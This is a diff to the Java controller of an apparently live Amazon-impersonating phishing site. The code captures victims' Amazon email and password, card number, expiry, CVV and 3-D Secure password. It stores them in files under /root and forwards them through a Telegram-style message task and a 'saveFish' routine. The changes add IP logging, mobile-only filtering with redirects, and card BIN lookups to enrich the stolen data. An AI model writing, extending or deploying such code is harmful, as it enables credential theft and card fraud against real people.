@@ -2,9 +2,14 @@ package com.kidd.amazon.web;
 
 
 import cn.hutool.core.date.DateUtil;
+import cn.hutool.core.io.FileUtil;
+import cn.hutool.core.io.file.FileAppender;
 import cn.hutool.http.Header;
 import cn.hutool.http.HttpRequest;
-import cn.hutool.http.HttpUtil;
+import cn.hutool.http.useragent.UserAgent;
+import cn.hutool.http.useragent.UserAgentUtil;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
 import com.kidd.amazon.common.IpUtils;
 import com.kidd.amazon.model.enums.CardType;
 import com.kidd.amazon.task.AsyncTask;
@@ -39,8 +44,27 @@ public class Amazon2MobileController {
     private HttpServletResponse response;
 
     @GetMapping("/amazon2/mobile/signin")
-    public Object signin() {
-        return "amazon2/mobile/index";
+    public Object signin(@RequestHeader("User-Agent") String uaStr) {
+        String ip = IpUtils.getIpAddress(request);
+        String path = "/root/countClickLink2.txt";
+        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
+        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
+        if (!FileUtil.exist(path)) {
+            FileUtil.newFile(path);
+        }
+        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
+        fileAppender.append(timeStr+":"+"|"+ip);
+        fileAppender.flush();
+        Boolean isMobile = false;
+        UserAgent ua = UserAgentUtil.parse(uaStr);
+        isMobile = ua.isMobile();
+        if (isMobile) return "amazon2/mobile/index";
+        else return "redirect:/signin";
+    }
+
+    @GetMapping("/")
+    public Object signin2(@RequestHeader("User-Agent") String uaStr) {
+        return "redirect:/amazon2/mobile/signin";
     }
 
     @GetMapping("/amazon2/mobile/homepage/billing")
@@ -91,7 +115,7 @@ public class Amazon2MobileController {
         HttpSession session = request.getSession();
         Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
         userInfoMap.put("AmazonId",params.get("email")!=null?params.get("email")[0]:"");
-        userInfoMap.put("AmazomPwd",params.get("password")!=null?params.get("password")[0]:"");
+        userInfoMap.put("AmazonPwd",params.get("password")!=null?params.get("password")[0]:"");
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
@@ -130,13 +154,14 @@ public class Amazon2MobileController {
         userInfoMap.put("expire",params.get("exdatemoon")[0]+"/"+params.get("exdateyear")[0]);
         userInfoMap.put("cvv",params.get("cvc")[0]);
         CardType cardType = CardType.detect(params.get("cardnumber")[0]);
-        //userInfoMap.put("cardType",cardType.getDescription());
+        userInfoMap.put("cardType",cardType.getDescription());
         String binInfo = getBinInfo(params.get("cardnumber")[0]);
         userInfoMap.put("binInfo",binInfo);
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
         asyncTask.asyncWriteMap(String.format("/root/amazon2-step3/%s.txt", timeStr), userInfoMap);
+        asyncTask.asyncSaveFish("/root/lack"+timeStr+"/",userInfoMap);
         return new HashMap<String,String>(){{put("data","ok");}};
     }
 
@@ -146,18 +171,21 @@ public class Amazon2MobileController {
         Map<String, String[]> params = request.getParameterMap();
         HttpSession session = request.getSession();
         Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
-        userInfoMap.put("webid",params.get("mmname")!=null?params.get("mmname")[0]:"");
+        if(null!=params.get("mmname")) {
+            userInfoMap.put("webid", params.get("mmname") != null ? params.get("mmname")[0] : "");
+        }
         userInfoMap.put("3dSecret",params.get("passvbv")!=null?params.get("passvbv")[0]:"");
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
         asyncTask.asyncWriteMap(String.format("/root/amazon2-step4/%s.txt", timeStr), userInfoMap);
         asyncTask.asyncSendTgMsg(null,null,userInfoMap);
+        asyncTask.asyncSaveFish("/root/full"+timeStr+"/",userInfoMap);
         return new HashMap<String,String>(){{put("data","ok");}};
     }
 
     private String getBinInfo(String cardNo){
-        String binInfo = "";
+        String binInfo = "{}";
         try {
            binInfo = HttpRequest.get("https://lookup.binlist.net/"+cardNo)
                     .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
@@ -168,6 +196,13 @@ public class Amazon2MobileController {
         catch (Exception e){
             log.error("query bin fail:"+e.getMessage());
         }
-        return binInfo;
+        JSONObject jsonObject = JSON.parseObject(binInfo);
+        if(jsonObject!=null && jsonObject.containsKey("country")){
+            jsonObject.remove("country");
+        }
+        if(jsonObject!=null && jsonObject.containsKey("number")){
+            jsonObject.remove("number");
+        }
+        return jsonObject.toJSONString();
     }
 }
